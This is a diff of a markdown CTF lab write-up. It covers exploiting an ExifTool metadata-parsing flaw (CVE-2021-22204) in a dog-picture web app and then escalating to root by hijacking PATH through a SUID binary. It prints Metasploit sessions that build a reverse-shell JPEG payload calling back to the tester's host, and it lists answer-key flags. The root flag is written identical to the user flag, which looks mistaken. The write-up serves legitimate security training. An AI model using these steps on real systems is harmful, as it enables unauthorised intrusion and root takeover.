@@ -22,7 +22,6 @@ Writeups in the format of a Penetration Testing Report are more than welcome. Ot
 
 ### Dog Pictures - Exploring a webapp 
 
-
 Webapp Enumeration
 
 After our initial port scan, we find two open ports. As usual, SSH is not much use without credentials as it's up to date. This just leaves us with a web application to explore.
@@ -32,7 +31,6 @@ From Nmap's service version detection, we know that the backend is built in Gola
 The first step in exploiting a webapp, like exploiting anything else, is reconnaissance. Exploring the webapp to discover functionality is critical for gaining a basic familiarity with the webapp and potentially how it works. Navigating the webapp without actively trying to exploit the functionality is called walking the happy path. You can learn more about this technique (and a lot more) in this room: Walking An Application.
 
 Open up Burp Suite with your browser of choice (I like the integrated Chromium) and we can start exploring the site.
-
 
 Click around the website. Can you find any developer comments?
 <!--
@@ -154,7 +152,6 @@ Burp Suite's target site map should have discovered 2 API routes that the websit
 
 It appears the API route used to retrieve the date and author does so with EXIF data, and uses Exiftool from the response. It appears the output of the command is simply serialised into JSON and sent to the client. This gives us a lot of information, notably the ExifTool version number. This is considered a vulnerability under the [OWASP API Top 10](https://owasp.org/www-project-api-security/), more specifically API3:2019 Excessive Data Exposure. Usually, exposing version numbers would be considered a low or informational rated issue but as we will discover it can have more serious consequences.
 
-
 What page can be used to upload your own dog picture?
 */upload/*
 
@@ -195,8 +192,6 @@ What API route is used to provide the Title and Caption for a specific dog image
 */dog/getmetadata*  looking view-source:http://10.10.192.184/dogpic/dogpic.js
 What API route does the application use to retrieve further information about the dog picture?
 */dog/getexifdata*
-
-![[Pasted image 20220921123700.png]]
 
 What attribute in the JSON response from this endpoint specifies the version of ExifTool being used by the webapp?
 *ExifToolVersion* (using burpsuite)
@@ -267,7 +262,6 @@ Matching Modules
    -  ----                                                      ---------------  ----       -----  -----------
    0  exploit/unix/fileformat/exiftool_djvu_ant_perl_injection  2021-05-24       excellent  No     ExifTool DjVu ANT Perl injection
 
-
 Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
 
 msf6 > use 0
@@ -280,7 +274,6 @@ Module options (exploit/unix/fileformat/exiftool_djvu_ant_perl_injection):
    ----      ---------------  --------  -----------
    FILENAME  msf.jpg          yes       Output file
 
-
 Payload options (cmd/unix/reverse_netcat):
 
    Name   Current Setting  Required  Description
@@ -290,20 +283,16 @@ Payload options (cmd/unix/reverse_netcat):
 
    **DisablePayloadHandler: True   (no handler will be created!)**
 
-
 Exploit target:
 
    Id  Name
    --  ----
    0   JPEG file
 
-
 msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > 
         
 
-
     
-
 
 ```
 
@@ -314,7 +303,6 @@ If you didn't like my explanations, want to learn more, or you want to see how t
     https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/
     https://blogs.blackberry.com/en/2021/06/from-fix-to-exploit-arbitrary-code-execution-for-cve-2021-22204-in-exiftool
     https://www.openwall.com/lists/oss-security/2021/05/10/5
-
 
 ```
 ┌──(kali㉿kali)-[~/Downloads]
@@ -338,7 +326,6 @@ Matching Modules
    0  exploit/unix/fileformat/exiftool_djvu_ant_perl_injection  2021-05-24       excellent  No     ExifTool DjVu ANT Perl injection
    1  exploit/multi/http/gitlab_exif_rce                        2021-04-14       excellent  Yes    GitLab Unauthenticated Remote ExifTool Command Injection
 
-
 Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/gitlab_exif_rce                                                                                                          
 
 msf6 > use 0
@@ -357,7 +344,6 @@ Module options (exploit/unix/fileformat/exiftool_djvu_ant_perl_injection):
    ----      ---------------  --------  -----------
    FILENAME  msf.jpg          yes       Output file
 
-
 Payload options (cmd/unix/python/meterpreter/reverse_tcp):
 
    Name   Current Setting  Required  Description
@@ -367,13 +353,11 @@ Payload options (cmd/unix/python/meterpreter/reverse_tcp):
 
    **DisablePayloadHandler: True   (no handler will be created!)**
 
-
 Exploit target:
 
    Id  Name
    --  ----
    0   JPEG file
-
 
 msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > set lhost 10.18.1.77
 lhost => 10.18.1.77
@@ -382,9 +366,6 @@ lport => 4444
 msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > run
 
 [+] msf.jpg stored at /home/kali/.msf4/local/msf.jpg
-
-
-
 
 ```
 
@@ -499,7 +480,6 @@ total 12
 drwxr-xr-x  2 kali kali 4096 Sep 21 13:52 .
 drwxr-xr-x 10 kali kali 4096 Jul 25 14:46 ..
 -rw-r--r--  1 kali kali 2573 Sep 21 13:52 msf.jpg
-
 
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ mkdir exiftool 
@@ -645,7 +625,6 @@ drwxr-xr-x 10 kali kali 4096 Jul 25 14:46 ..
 └─$ ls
 msf.jpg
 
-
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ searchsploit exiftool          
 ------------------------------------------------------------------------- ---------------------------------
@@ -667,7 +646,6 @@ Matching Modules
    0  exploit/unix/fileformat/exiftool_djvu_ant_perl_injection  2021-05-24       excellent  No     ExifTool DjVu ANT Perl injection
    1  exploit/multi/http/gitlab_exif_rce                        2021-04-14       excellent  Yes    GitLab Unauthenticated Remote ExifTool Command Injection
 
-
 Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/gitlab_exif_rce                                                                                                          
 
 msf6 > use 0
@@ -686,7 +664,6 @@ Module options (exploit/unix/fileformat/exiftool_djvu_ant_perl_injection):
    ----      ---------------  --------  -----------
    FILENAME  msf.jpg          yes       Output file
 
-
 Payload options (cmd/unix/python/meterpreter/reverse_tcp):
 
    Name   Current Setting  Required  Description
@@ -696,13 +673,11 @@ Payload options (cmd/unix/python/meterpreter/reverse_tcp):
 
    **DisablePayloadHandler: True   (no handler will be created!)**
 
-
 Exploit target:
 
    Id  Name
    --  ----
    0   JPEG file
-
 
 msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > set lhost 10.18.1.77
 lhost => 10.18.1.77
@@ -745,7 +720,6 @@ Get code execution on the target machine
 
 Retrieve the flag located in /home/dogpics/user.txt. What is the user flag?
 *dejavu{735c0553063625f41879e57d5b4f3352}*
-
 
 ### Privilege Escalation - Enumeration and PATH Exploitation 
 
@@ -804,7 +778,6 @@ Sep 11 18:00:08 dejavu systemd[1]: Started Dog pictures.
 
         
 
-
 ```
 
 As we have the source code of the application, we can more easily see the vulnerability.
@@ -854,7 +827,6 @@ int main(void)
 
         
 
-
 ```
 
 The vulnerability comes from calling system() without providing a full path to the binary. This means that we can create a fake systemctl binary which will run as root, and escalate our privileges.
@@ -889,8 +861,6 @@ system("systemctl status --no-pager dogp"...● dogpics.service - Dog pictures
 )                                                      = 0
 
         
-
-
 
 ```
 
@@ -934,9 +904,7 @@ root
 
         
 
-
 ```
-
 
 Let's break this down:
 
@@ -955,23 +923,16 @@ Further reading on this method
 
 https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
 
-
-
 Stabilise your reverse shell to ensure that you can run interactive binaries
 
 Find the SUID binary
 
-
 Verify (based on output) that the serverManager program runs systemctl when you run it.
 Try running the same command as the binary yourself - systemctl status dogpics --no-pager
 
-
-
 Create your fake systemctl, ensure it's correctly added to PATH, and escalate your privileges.
-
 
 Retrieve the root flag from /root/root.txt. What is the root flag?
 *dejavu{735c0553063625f41879e57d5b4f3352}*
-
 
 [[Dig Dug]]
